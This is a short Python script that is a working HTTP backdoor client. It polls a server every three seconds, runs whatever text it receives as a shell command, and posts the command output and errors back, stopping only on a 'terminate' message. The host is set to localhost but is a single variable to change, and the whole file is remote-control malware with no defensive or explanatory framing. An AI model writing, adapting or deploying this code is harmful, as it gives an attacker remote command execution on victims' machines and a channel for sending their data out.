import requests
import subprocess
import time

HOST_NAME = '127.0.0.1'
PORT_NUMBER = 80

while True:
    try:
        req = requests.get(f'http://{HOST_NAME}:{PORT_NUMBER}')
        req.raise_for_status()  # Check for errors in the HTTP request

        command = req.text
        if 'terminate' in command:
            break

        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = CMD.communicate()

        post_response = requests.post(url=f'http://{HOST_NAME}:{PORT_NUMBER}', data=output.decode('utf-8'))
        post_response.raise_for_status()  # Check for errors in the HTTP post

        post_response = requests.post(url=f'http://{HOST_NAME}:{PORT_NUMBER}', data=error.decode('utf-8'))
        post_response.raise_for_status()

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    except Exception as e:
        print(f"Exception: {e}")

    time.sleep(3)
